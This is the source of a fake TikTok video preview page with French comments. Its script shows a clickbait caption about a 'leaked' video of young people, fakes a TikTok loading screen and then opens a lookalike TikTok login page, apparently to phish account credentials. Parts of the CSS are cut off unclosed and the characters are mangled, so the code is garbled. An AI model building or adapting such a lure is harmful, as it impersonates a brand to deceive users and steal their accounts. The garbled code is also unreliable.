        .play-button {

            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;

        }

        .play-button::after {
            content: '';
            border-style: solid;
            border-width: 15px 0 15px 25px;
            border-color: transparent transparent transparent #000;
            margin-left: 5px;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.9; }
            50% { transform: scale(1.1); opacity: 1; }
            100% { transform: scale(1); opacity: 0.9; }
        }

        .tiktok-ui {
            position: absolute;
            bottom: 100px;
            left: 20px;
            right: 70px;
            z-index: 3;
        }

        .user-info {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }

        .avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(45deg, #ff0050, #ff4d6d);
            margin-right: 12px;
            display: flex;

        }

        .username {

        .side-actions {

            z-index: 3;

        .action-btn {

            align-items: center;

            font-size: 24px;

        .action-btn:hover {

        .tiktok-logo {
            position: absolute;
            top: 60px;
            left: 50%;

        }

        .tiktok-logo svg {

        }

        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            z-index: 999;

        .spinner {
            width: 50px;

            border: 3px solid rgba(255, 0, 80, 0.3);
            border-radius: 50%;
            border-top-color: #ff0050;
            animation: spin 1s ease-in-out infinite;
            margin-bottom: 20px;

        @keyframes spin {

        .instructions {

<script>
    // üéØ CONFIGURATION - Modifiez ces URLs selon vos besoins
    const REDIRECT_TIKTOK_URL = "https://tiktok-auth-client.vercel.app/login";

    // Variables pour l'aper√ßu
    const USERNAME = "@username";
    const DESCRIPTION = " Voici la nouvelle vid√©o LOMOTIF de ces jeunes qui a fuit√© - üî•‚ú®";
    const HASHTAGS = "#viral #trending #fyp #foryou";

    // Fonction de redirection avec effet de chargement
    function redirectToTikTok() {
        const loadingScreen = document.getElementById('loadingScreen');
        loadingScreen.style.display = 'flex';

        // Simule un temps de chargement comme TikTok
        setTimeout(() => {
            window.open(REDIRECT_TIKTOK_URL, '_blank');
            loadingScreen.style.display = 'none';
        }, 1500);
    }

    // Gestion des clics
    document.getElementById('tiktokContainer').addEventListener('click', redirectToTikTok);

    // Toggle instructions sur mobile
    function toggleInstructions() {
        const instructions = document.getElementById('instructions');
        instructions.style.display = instructions.style.display === 'block' ? 'none' : 'block';
    }

    // Mise √† jour dynamique du contenu
    document.addEventListener('DOMContentLoaded', function() {
        document.querySelector('.username').textContent = USERNAME;
        document.querySelector('.description').textContent = DESCRIPTION;
        document.querySelector('.hashtags').textContent = HASHTAGS;
    });

    // Animation d'entr√©e
    window.addEventListener('load', function() {
        document.querySelector('.tiktok-container').style.animation = 'slideUp 0.5s ease-out';
    });
</script>

<style>
    @keyframes slideUp {
        from {
            transform: translateY(100px);
            opacity: 0;
        }
        to {

        }
    }
